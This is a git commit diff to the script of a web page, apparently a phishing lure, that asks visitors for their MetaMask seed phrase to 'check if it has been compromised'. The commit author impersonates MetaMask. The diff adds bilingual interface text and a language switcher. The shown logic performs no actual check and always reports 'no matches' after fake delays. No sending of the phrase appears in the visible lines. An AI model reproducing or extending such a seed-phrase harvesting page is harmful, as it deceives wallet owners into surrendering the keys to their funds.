40aac78e2d3a2fe07dac77094d46df2bd7a383c6
Metamask0 <metamask.keys@gmail.com>
2022-03-01 00:19:37 -0500

    b

--- index.js
+++ index.js
@@ -1,6 +1,47 @@
 const form = document.querySelector("form"),
-	btn = document.getElementById("btn");
-let input = form.querySelector("input[type='text']");
+	btn = document.getElementById("btn"),
+	iconLang = document.querySelector(".lang");
+let input = form.querySelector("input[type='text']"),
+	lang = {
+		"español": {
+			"title": "Verifica frase semilla de MetaMask",
+			"text": "Comprueba si su frase semilla de MetaMask ha sido comprometida",
+			"text2": "Separé cada palabra con un espacio",
+			"errorLeng": "La frase debe de tener de 12 a 24 palabras",
+			"errorNumber": "La frase no debe tener números ni caracteres",
+			"success": "Enhorabuena, no hay coincidencias",
+			"textBtn": "Verificar",
+			"cheking": "Verificando",
+			"delete": "Borrando",
+			"placeholder": "Ingresar frase"
+		},
+		"ingles": {
+			"title": "Verify MetaMask seed phrase",
+			"text": "Check if your MetaMask seed phrase has been compromised",
+			"text2": "I separated each word with a space",
+			"errorLeng": "The sentence must have between 12 and 24 words",
+			"errorNumber": "The phrase must not have numbers or characters",
+			"success": "Congratulations, there are no matches",
+			"textBtn": "Check",
+			"cheking": "Cheking",
+			"delete": "Delete",
+			"placeholder": "Enter phrase"
+		}
+	}
+changaLang()
+
+iconLang.addEventListener("click", (e) => {
+	iconLang.classList.toggle("active");
+
+	if (e.target.localName == "p") {
+
+		localStorage.setItem('lang', e.target.dataset.lang);
+
+	}
+	changaLang()
+
+})
+
 form.addEventListener("submit", e => {
 	let door = true,
 		cont = 0;
@@ -10,9 +51,9 @@ form.addEventListener("submit", e => {
 	let data = input.value.split(" ")
 
 	if (data.length < 12 || data.length > 24) {
-		btn.value = "La frase debe de tener de 12 a 24 palabras"
+		btn.value = `${lang[localStorage.getItem("lang")].errorLeng}`
 		setTimeout(() => {
-			btn.value = "Verificar"
+			btn.value = `${lang[localStorage.getItem("lang")].textBtn}`
 
 		}, 2000)
 		return false
@@ -24,27 +65,27 @@ form.addEventListener("submit", e => {
 			data.splice(i, 1)
 		}
 	}
-	console.log(data)
+
 	data.forEach((elem, index) => {
-		console.log(elem, isNaN(elem))
+
 		if (isNaN(elem) == false) {
 			cont++
-			btn.value = "La frase no debe tener números ni carácteres "
+			btn.value = `${lang[localStorage.getItem("lang")].errorNumber}`
 			setTimeout(() => {
-				btn.value = "Verificar"
+				btn.value = `${lang[localStorage.getItem("lang")].textBtn}`
 			}, 2000)
 
 		}
 		if (index == data.length - 1) {
 			if (cont == 0) {
-				btn.value = "Verificando..."
+				btn.value = `${lang[localStorage.getItem("lang")].cheking}...`
 				setTimeout(() => {
-					btn.value = "Enhorabuena, no hay coincidencias"
+					btn.value = `${lang[localStorage.getItem("lang")].success}`
 					setTimeout(() => {
-						btn.value = "Borrando consulta..."
+						btn.value = `${lang[localStorage.getItem("lang")].delete}...`
 						setTimeout(() => {
-							btn.value = "Verificar"
-														input.value = ""
+							btn.value = `${lang[localStorage.getItem("lang")].textBtn}`
+							input.value = ""
 						}, 2500)
 					}, 2500)
 				}, 4000)
@@ -71,3 +112,23 @@ form.addEventListener("submit", e => {
 
 
 })
+
+
+
+function changaLang() {
+	if(localStorage.getItem("lang") == null){
+		localStorage.setItem("lang", "ingles")
+	}
+		
+	
+	let langs = document.querySelectorAll(".langs");
+	langs.forEach((elem, i) => {
+		if (i == 0) { elem.innerHTML = lang[localStorage.getItem("lang")].title }
+		if (i == 1) { elem.innerHTML = lang[localStorage.getItem("lang")].text }
+		if (i == 2) { elem.placeholder = lang[localStorage.getItem("lang")].placeholder }
+		if (i == 3) { elem.innerHTML = lang[localStorage.getItem("lang")].text2 }
+
+
+	})
+	btn.value= lang[localStorage.getItem("lang")].textBtn
+}
